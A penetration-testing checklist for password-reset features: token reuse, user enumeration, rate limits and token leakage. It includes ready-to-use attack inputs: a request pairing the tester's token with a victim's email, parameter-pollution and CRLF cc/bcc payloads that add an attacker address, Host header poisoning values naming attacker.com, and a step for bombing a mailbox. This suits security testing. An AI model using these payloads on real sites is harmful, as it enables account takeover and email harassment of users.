# Reset/Forget Password

There are some test should be done:

- [ ]  Is it one time use?
- [ ]  Use Your Token on Victims Email
- [ ]  HTML injection in Email
- [ ]  Manipulate Email parameter
- [ ]  When 2-10 links are requested, the prior link expires?
- [ ]  Is it bind in an account or the link works when the Email has been changed?
- [ ]  Can you Enumerate All Email?
- [ ]  Can you send so many reset email to a specific in order to spam their email
- [ ]  Can you inject an arbitrary header to the request? (Host header poising)
- [ ]  Can you add `Referrer` to the request
- [ ]  Response manipulation
- [ ]  Long password (200+) leads to DoS
- [ ]  Use `User@burp_collab.net`
- **How to test them**
    - Not one Time (search for leaked tokens `gau`, `scan.io`, `waybackurl`)
        - change the password through link and log out again try to change password again
    - Use Your Token on Victims Email
        
        ```
        ```
        POST /reset
        ...
        ...
        email=victim@gmail.com&token=$YOUR-TOKEN$
        
        ```
        ```
        
    - HTML injection in Email
        - HTML injection in email via parameters, cookie, etc > inject image > leak the token
    - Use the first link or second to change the Pass and re-use the another link
    - Bind to account
        - Create an account and make a request to reset your password don’t use the link and change your email and now change your pass with the previous reset link
    - Enumeration
        - Enter the email that does not exsit, now enter email that exist! does it reveal users? or have diference?
    - Brute force
        - send the request to Burp and use null passlist
    - Token leakage in the Host header
        1. Enter your email and be sent the link open it
        2. can be seen in the URL bar, do not change your pass
        3. open third party sites like facebook etc. while the intercept is on or capture the request
        4. you can see your token leaked
    - Manipulate the parameters
        
        ```jsx
        
        email=victim@gmail.com&email=attacker@gmail.com
        email=victim@gmail.com%20email=attacker@gmail.com
        email=victim@gmail.com|email=attacker@gmail.com
        email="victim@gmail.com%0a%0dcc:email=attacker@gmail.com
        email="victim@gmail.com%0a%0dbcc:email=attacker@gmail.com
        email="victim@gmail.com",email="attacker@gmail.com
        {"email": ["victim@gmail.com","attacker@gmail.com"]}
        
        ```
        
    - Host header poising
        1. Open the link through Burp and intercept it, add Host header like bellow
        
        ```bash
        #0-- Host: attacker.com
        #1-- Host:target.com
        #1-- Host:attacker.com
        #2-- Host: attacker.com/target.com
        	#3-- X-Forwarded-Host: attacker.com --> add this bellow host headet
        #4-- X-Host: attacker.com
        #5 X-Forwarded-Server: aliali.com
        ```
        

Some tests:

1. You should be able to change your password one time, Log out and try the reset link again
2. when there are more than one link, one of it should just work
3. when you request to reset your password with an account e.g. `ali@ali.com` and keep the link unopen, then you change the email and try to reset your pass by the prior link
4. when the email does not exists, it does not have to reveal someone else account
5. send the request to the intruder and make the request till 50 times to bomb email box
6. when it allows you to inject Host header to a packet it can be loged in that server
7. Referrer means to third party may have you token